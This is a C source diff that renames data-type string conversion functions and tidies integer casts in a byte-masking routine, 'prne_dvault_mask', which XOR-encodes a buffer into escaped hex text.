@@ -62,7 +62,7 @@ static void entry_check (const prne_data_key_t key, const prne_data_type_t type)
 }
 
 
-const char *prne_data_type2str (const prne_data_type_t t) {
+const char *prne_data_type_tostr (const prne_data_type_t t) {
     switch (t) {
     case PRNE_DATA_TYPE_CSTR: return "cstr";
     case PRNE_DATA_TYPE_BIN: return "bin";
@@ -70,11 +70,11 @@ const char *prne_data_type2str (const prne_data_type_t t) {
     return NULL;
 }
 
-prne_data_type_t prne_str2data_type (const char *str) {
-    if (strcmp(str, prne_data_type2str(PRNE_DATA_TYPE_CSTR)) == 0) {
+prne_data_type_t prne_data_type_fstr (const char *str) {
+    if (strcmp(str, prne_data_type_tostr(PRNE_DATA_TYPE_CSTR)) == 0) {
         return PRNE_DATA_TYPE_CSTR;
     }
-    if (strcmp(str, prne_data_type2str(PRNE_DATA_TYPE_BIN)) == 0) {
+    if (strcmp(str, prne_data_type_tostr(PRNE_DATA_TYPE_BIN)) == 0) {
         return PRNE_DATA_TYPE_BIN;
     }
     
@@ -108,7 +108,7 @@ prne_dvault_mask_result_t prne_dvault_mask (const prne_data_type_t type, const u
 
     prne_init_dvault_mask_result(&ret);
 
-    if (data_size > 0x0000FFFF) {
+    if (data_size > 0xFFFF) {
         ret.result = PRNE_DVAULT_MASK_TOO_LARGE;
         return ret;        
     }
@@ -126,10 +126,10 @@ prne_dvault_mask_result_t prne_dvault_mask (const prne_data_type_t type, const u
     }
 
     sprintf(ret.str, "\\x%02X\\x%02X\\x%02X\\x%02X",
-        (uint8_t)type,
+        type,
         salt,
-        (uint8_t)((0x0000FF00 & (uint32_t)data_size) >> 8),
-        (uint8_t)((0x000000FF & (uint32_t)data_size) >> 0));
+        (int)((0xFF00 & (uint_fast16_t)data_size) >> 8),
+        (int)((0x00FF & (uint_fast16_t)data_size) >> 0));
 
     for (i = 0; i < data_size; i += 1) {
         sprintf(ret.str + 4 * 4 + 4 * i, "\\x%02X", data[i] ^ PRNE_DVAULT_MASK[(i + (size_t)salt) % 256]);
